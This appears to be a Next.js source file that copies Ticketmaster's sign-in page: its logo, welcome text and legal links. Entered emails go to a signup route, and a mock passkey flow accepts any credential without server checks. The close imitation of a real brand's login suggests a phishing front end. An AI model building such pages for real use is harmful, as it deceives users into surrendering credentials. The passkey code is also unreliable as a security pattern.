'use client';

import styled, { keyframes, css } from 'styled-components';
import Link from 'next/link';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { QRCodeSVG } from 'qrcode.react';

// STYLED COMPONENTS (LAYOUT & BASIC)
const PageWrapper = styled.main`
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #f5f5f5;
  
  @media (max-width: 720px) {
    background: white;
    align-items: stretch;
  }
`;

const AuthCard = styled.div`
  display: grid;
  grid-template-columns: 40% 60%;
  width: 100%;
  max-width: 1000px;
  height: 100vh;
  max-height: 800px;
  box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
  border-radius: 8px;
  overflow: hidden;
  background: white;
  
  @media (max-width: 720px) {
    grid-template-columns: 1fr;
    max-height: none;
    height: 100%;
    min-height: 100vh;
    border-radius: 0;
    box-shadow: none;
  }
`;

const LeftPanel = styled.div`
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  height: 100%;
  background-color: rgb(18, 18, 18);
  background-size: cover;
  padding: 0px 32px;
  hyphens: auto;
  
  @media (max-width: 900px) {
    display: none;
  }
`;

const ContentInfo = styled.div`
  display: flex;
  flex-direction: column;
  padding-top: 32px;
  gap: 8px;
`;


const TextRow = styled.div``;

const WelcomeLabel = styled.span`
  font-size: 44px;
  line-height: 44px;
  text-transform: uppercase;
  color: rgb(255, 255, 255);
  font-weight: 800;
  letter-spacing: 0.05em;
  display: block;
  
  &::after {
    content: "";
    display: block;
    height: 4px;
    background: rgb(2, 77, 223);
    margin-top: 8px;
  }
`;


const WelcomeDescription = styled.span`
  font-size: 16px;
  line-height: 22px;
  letter-spacing: 0.02em;
  font-weight: 600;
  color: white;
  padding-top: 32px;
`;



const LogoBottomImage = styled.img`
  width: 156px;
  height: auto;
  margin-bottom: 32px;
`;

const RightPanel = styled.div`
  background: #ffffff;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px 0;
  overflow-y: auto;
  
  @media (max-width: 720px) {
    padding: 20px 0;
  }
`;

const FormContainer = styled.div`
  width: 100%;
  max-width: 480px;
  display: flex;
  flex-direction: column;
  gap: 24px;
`;

const Section = styled.div`
  padding-left: 24px;
  padding-right: 24px;
  position: relative;
  
  @media (min-width: 768px) {
    padding-left: 48px;
    padding-right: 48px;
  }
`;

const MainSection = styled(Section)``;

const ButtonSection = styled(Section)`
  display: flex;
  flex-direction: column;
  justify-content: center;
  gap: 16px;
`;

const FormTitle = styled.h2`
  font-size: 22px;
  font-weight: 700;
  color: rgb(18, 18, 18);
  margin: 0 0 8px 0;
  text-transform: uppercase;
  letter-spacing: 0.02em;
  line-height: 24px;
`;

const FormSubtitle = styled.p`
  font-size: 14px;
  color: rgb(18, 18, 18);
  margin: 0 0 24px 0;
  line-height: 1.4;
`;

const Form = styled.form`
  display: flex;
  flex-direction: column;
  gap: 24px;
`;

const InputGroup = styled.div``;

const Label = styled.label`
  display: block;
  font-size: 14px;
  font-weight: 400;
  color: rgb(18, 18, 18);
  margin-bottom: 8px;
`;

const Input = styled.input<{ $error?: boolean }>`
  width: 100%;
  height: 48px;
  padding: 0 12px;
  border: 1px solid ${({ $error }) => ($error ? '#c0392b' : 'rgb(195, 195, 195)')};
  border-radius: 4px;
  font-size: 16px;
  color: rgb(18, 18, 18);
  background: white;
  transition: border-color 0.2s;
  
  &:focus {
    outline: none;
    border-color: ${({ $error }) => ($error ? '#c0392b' : '#026cdf')};
  }
  
  &::placeholder {
    color: #767676;
  }
`;

const ErrorContainer = styled.div`
  display: flex;
  align-items: flex-start;
  gap: 8px;
  margin-top: 8px;
  color: #c0392b;
  
  svg {
    width: 1.2em;
    height: 1.2em;
    flex-shrink: 0;
    margin-top: 2px;
  }
`;

const ErrorText = styled.div`
  font-size: 14px;
  line-height: 1.4;
`;

const bounce = keyframes`
  0%, 80%, 100% { 
    transform: scale(0);
  } 
  40% { 
    transform: scale(1.0);
  }
`;

const DotsContainer = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 4px;
  height: 24px;
`;

const Dot = styled.div`
  width: 8px;
  height: 8px;
  background-color: white;
  border-radius: 100%;
  animation: ${bounce} 1.4s infinite ease-in-out both;
  
  &:nth-child(1) { animation-delay: -0.32s; }
  &:nth-child(2) { animation-delay: -0.16s; }
`;

const Button = styled.button<{ $disabled?: boolean }>`
  margin: initial;
  border: none;
  font-family: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  padding: 8px 24px;
  color: white;
  background-color: ${({ $disabled }) => ($disabled ? '#e5e7eb' : '#026cdf')};
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  min-height: 44px;
  border-radius: 4px;
  font-weight: 600;
  font-size: 16px;
  white-space: nowrap;
  text-align: center;
  transition: background-color 0.2s;
  cursor: ${({ $disabled }) => ($disabled ? 'not-allowed' : 'pointer')};
  
  &:hover:not(:disabled) {
    background-color: #0052b0;
  }
`;

const Divider = styled.div`
  position: relative;
  text-align: center;
  margin: 8px 0;
  width: 100%;
  
  &::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    height: 1px;
    background: rgb(195, 195, 195);
  }
  
  span {
    position: relative;
    background: #ffffff;
    padding: 0 16px;
    font-size: 14px;
    color: rgb(18, 18, 18);
    font-weight: 400;
    text-transform: uppercase;
  }
`;

const PasskeyButton = styled.button`
  margin: initial;
  border: 1px solid rgb(195, 195, 195);
  font-family: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  text-transform: inherit;
  padding: 8px 24px 8px 16px;
  color: rgb(18, 18, 18);
  background-color: transparent;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  width: 100%;
  min-height: 44px;
  border-radius: 4px;
  font-weight: 600;
  font-size: 16px;
  white-space: nowrap;
  text-align: center;
  transition: background-color 0.2s, color 0.2s;
  cursor: pointer;
  
  &:hover {
    background-color: rgb(18, 18, 18);
    color: white;
  }

  
  svg {
    width: 1.5em;
    height: 1.5em;
    fill: currentColor;
  }
`;

// Updated Passkey Info Button (replaces Link)
const PasskeyInfoButton = styled.button`
  margin: initial;
  border: none;
  font-family: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  padding: 8px 24px;
  color: #026cdf;
  background-color: transparent;
  display: block;
  width: 100%;
  min-height: 44px;
  border-radius: 4px;
  font-weight: 600;
  font-size: 16px;
  white-space: nowrap;
  text-align: center;
  transition: background-color 0.2s;
  cursor: pointer;

  
  &:hover {
    background-color: rgba(6, 111, 223, 0.04);
  }
`;

const LegalText = styled.div`
  font-size: 14px;
  text-align: left;
  color: rgb(100, 100, 100)!important;
  margin-top: 8px;
  letter-spacing: 0.02em;
  font-weight: 500;
  
  p {
    font-size: 14px;
    line-height: 18px;
    margin: 0 0 8px 0;
    letter-spacing: 0.02em;
    font-weight: 500;
    color: inherit;
  }
  
  a {
    color: #026cdf;
    text-decoration: underline;
  }
`;

// MODAL COMPONENTS
const ModalOverlay = styled.div`
  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0, 0, 0, 0.5); z-index: 1000;
  display: flex; align-items: center; justify-content: center;
`;

const ModalContent = styled.div`
  background: white; padding: 40px; border-radius: 8px;
  width: 90%; max-width: 500px; position: relative;
  box-shadow: 0 4px 20px rgba(0,0,0,0.15);
`;

const CloseButton = styled.button`
  position: absolute; top: 16px; right: 16px;
  background: none; border: none; font-size: 24px;
  cursor: pointer; color: #6b7280;
  &:hover { color: #1f262d; }
`;

const ModalTitle = styled.h2`
  display: flex; align-items: center; gap: 12px;
  font-size: 24px; font-weight: 700; color: #1f262d; margin-bottom: 24px;
  svg { width: 28px; height: 28px; }
`;

const ModalText = styled.p`
  font-size: 16px; line-height: 1.6; color: #1f262d; margin-bottom: 20px;
`;

const ModalLink = styled.a`
  display: block; color: #026cdf; font-weight: 600; text-decoration: none;
  margin-top: 20px;
  &:hover { text-decoration: underline; }
`;

const QRCodeContainer = styled.div`
  display: flex; flex-direction: column; align-items: center;
  padding: 24px; background: #f9fafb; border-radius: 8px;
  margin: 24px 0;
`;

const QRInstruction = styled.p`
  font-size: 16px; font-weight: 500; margin-bottom: 24px; text-align: center;
`;


// NEW STYLED COMPONENTS FOR STRUCTURE PARITY
const ScrollContent = styled.div`
  height: 100%;
  overflow-y: auto;
  overflow-x: hidden;
  display: flex;
  flex-direction: column;
  width: 100%;
`;

const Main = styled.main`
  flex: 1 0 auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px 0 48px 0;
  min-height: 0;
  
  @media (max-width: 720px) {
    padding: 24px 0;
  }
`;

const Stack = styled.div`
  display: flex;
  flex-direction: column;
  width: 100%;
  max-width: 480px;
  margin: 0 auto;
`;

const Header = styled.header`
  flex: 0 0 auto;
  padding: 24px 48px 0;
  
  @media (max-width: 720px) {
    padding: 24px 24px 0;
  }
`;


export default function SignInPage() {
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState(false);
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);

  // WebAuthn state
  const [webAuthnStatus, setWebAuthnStatus] = useState<'idle' | 'authenticating' | 'success' | 'error'>('idle');
  const [webAuthnError, setWebAuthnError] = useState<string | null>(null);

  const router = useRouter();

  const validateEmail = (email: string) => {
    const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return re.test(email);
  };

  // WebAuthn Passkey Authentication Handler
  const handlePasskeyAuth = async () => {
    setWebAuthnStatus('authenticating');
    setWebAuthnError(null);

    // Check if WebAuthn is supported
    if (!window.PublicKeyCredential) {
      setWebAuthnStatus('error');
      setWebAuthnError('WebAuthn is not supported in this browser.');
      return;
    }

    try {
      // Generate a mock challenge (in production, this comes from your server)
      const challenge = new Uint8Array(32);
      window.crypto.getRandomValues(challenge);

      // WebAuthn credential request options
      const publicKeyCredentialRequestOptions: PublicKeyCredentialRequestOptions = {
        challenge: challenge,
        timeout: 60000,
        rpId: window.location.hostname,
        userVerification: 'preferred',
        // Empty allowCredentials means the browser will show all available passkeys
        allowCredentials: [],
      };

      // Trigger the browser's native passkey/biometric dialog
      const credential = await navigator.credentials.get({
        publicKey: publicKeyCredentialRequestOptions,
        mediation: 'optional'
      }) as PublicKeyCredential;

      if (credential) {
        // In production, send credential to server for verification
        console.log('WebAuthn credential received:', credential.id);
        setWebAuthnStatus('success');

        // Simulate successful auth redirect
        setTimeout(() => {
          setShowLoginModal(false);
          router.push('/');
        }, 1500);
      }
    } catch (error: any) {
      console.error('WebAuthn error:', error);
      setWebAuthnStatus('error');

      if (error.name === 'NotAllowedError') {
        setWebAuthnError('Authentication was cancelled or not allowed.');
      } else if (error.name === 'SecurityError') {
        setWebAuthnError('Security error. Please ensure you are on a secure connection.');
      } else if (error.name === 'NotSupportedError') {
        setWebAuthnError('No passkeys found for this site.');
      } else {
        setWebAuthnError(error.message || 'An error occurred during authentication.');
      }
    }
  };

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateEmail(email)) {
      setEmailError(true);
      return;
    }

    setEmailError(false);
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      if (email.includes('new') || email === 'grindonly80@gmail.com') {
        router.push(`/auth/signup?email=${encodeURIComponent(email)}`);
      } else {
        router.push(`/auth/signup?email=${encodeURIComponent(email)}`);
      }
    }, 1500);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setEmail(e.target.value);
    if (emailError) setEmailError(false);
  };

  // Reset WebAuthn state when modal opens
  const openPasskeyModal = () => {
    setWebAuthnStatus('idle');
    setWebAuthnError(null);
    setShowLoginModal(true);
  };

  return (
    <PageWrapper>
      <AuthCard>
        <LeftPanel data-bdd="left-column">
          <ContentInfo role="contentinfo">
            <TextRow>
              <WelcomeLabel>Welcome</WelcomeLabel>
            </TextRow>
            <TextRow>
              <WelcomeDescription>
                Discover millions of events, get alerts about your favorite artists, teams, plays and more — plus always- secure, effortless ticketing.
              </WelcomeDescription>
            </TextRow>
            <TextRow />
          </ContentInfo>
          <LogoBottomImage
            src="/assets/ticketmaster-logo-white-small.bb30b12d.svg"
            alt="Ticketmaster logo"
          />
        </LeftPanel>

        <RightPanel>
          <ScrollContent>
            <Header>
              {/* Header content/logo if needed later, currently empty or could hold title */}
            </Header>
            <Main>
              <Stack>
                <MainSection>
                  <FormTitle>Sign In or Create Account</FormTitle>
                  <FormSubtitle>
                    If you don't have an account you will be prompted to create one.
                  </FormSubtitle>

                  <Form onSubmit={handleContinue}>
                    <InputGroup>
                      <Label htmlFor="email">Email Address</Label>
                      <Input
                        id="email"
                        type="email"
                        value={email}
                        onChange={handleInputChange}
                        $error={emailError}
                        placeholder=""
                        autoComplete="email"
                      />
                      {emailError && (
                        <ErrorContainer>
                          <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="m12 1 11 11.05L12 23 1 12.05z M11 6v9h2V6zm0 10.5v2h2v-2z" />
                          </svg>
                          <ErrorText role="alert">Please enter a valid email address.</ErrorText>
                        </ErrorContainer>
                      )}
                    </InputGroup>

                    <Button type="submit" disabled={loading}>
                      {loading ? (
                        <DotsContainer>
                          <Dot />
                          <Dot />
                          <Dot />
                        </DotsContainer>
                      ) : (
                        'Continue'
                      )}
                    </Button>
                  </Form>
                </MainSection>

                <ButtonSection>
                  <Divider>
                    <span>OR</span>
                  </Divider>

                  <PasskeyButton type="button" onClick={handlePasskeyAuth}>
                    <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                      <path d="m21.38 8.1 1 .97v3.87l-1 .98-.86.87v.57l1.24 1.23-1.24 1.24v.26l1.4 1.39-1.4 1.4v1.06L19.46 23H17.6l-1.16-1.17v-7.02l-.88-.89-1-.98V9.07l1-.97.97-1h3.88zm-4.8 1.02-.56.56v2.66l.57.55.55.57h.75v7.88l.2.2h.77l.2-.2v-1.07l.8-.79-.8-.8v-1.45l.64-.64-.64-.63v-2.5h.74l.56-.57.56-.55V9.68l-.57-.56-.55-.56h-2.66zm-3.78 3.93H5.56L3 15.38v2.88h11.65v1.42H1.63v-4.94l3.4-3.12h7.77zm6.4-2h-1.45V9.6h1.45zM10.37 1a4.57 4.57 0 0 1 4.48 4.66c0 2.57-2 4.66-4.48 4.66a4.57 4.57 0 0 1-4.48-4.66c0-2.57 2-4.66 4.48-4.66m0 1.5a3.1 3.1 0 0 0-3.03 3.16 3.1 3.1 0 0 0 3.03 3.16 3.1 3.1 0 0 0 3.03-3.16 3.1 3.1 0 0 0-3.03-3.16" />
                    </svg>
                    Sign In With A Passkey
                  </PasskeyButton>

                  <PasskeyInfoButton onClick={() => setShowInfoModal(true)}>
                    How To Add A Passkey
                  </PasskeyInfoButton>

                  <LegalText>
                    <p>
                      By continuing past this page, I acknowledge that I have read and agree to the current{' '}
                      <a href="https://help.ticketmaster.com/hc/en-us/articles/10468830739345-Terms-of-Use" target="_blank">Terms of Use</a>, including the arbitration agreement and class action waiver, updated in August 2025, and understand that information will be used as described in our{' '}
                      <a href="https://privacy.ticketmaster.com/privacy-policy" target="_blank">Privacy Policy</a>.
                    </p>
                    <p>
                      As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
                    </p>
                  </LegalText>
                </ButtonSection>
              </Stack>
            </Main>
          </ScrollContent>
        </RightPanel>

        {/* Passkey Info Modal */}
        {showInfoModal && (
          <ModalOverlay onClick={() => setShowInfoModal(false)}>
            <ModalContent onClick={e => e.stopPropagation()}>
              <CloseButton onClick={() => setShowInfoModal(false)}>×</CloseButton>
              <ModalTitle>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
                </svg>
                Passkeys
              </ModalTitle>
              <ModalText>
                Passkeys are digital keys saved to your device and password manager. Sign in quickly and securely using your face, fingerprint, or device lock.
              </ModalText>
              <ModalText>
                To sign in with a passkey, you first need to add one to your account. Sign in to your account on a mobile or desktop browser using your password. Go to My Profile and select the 'Sign In & Security' tab to add a passkey.
              </ModalText>
              <ModalLink href="#">Learn more about Passkeys</ModalLink>
            </ModalContent>
          </ModalOverlay>
        )}

      </AuthCard>
    </PageWrapper>
  );
}

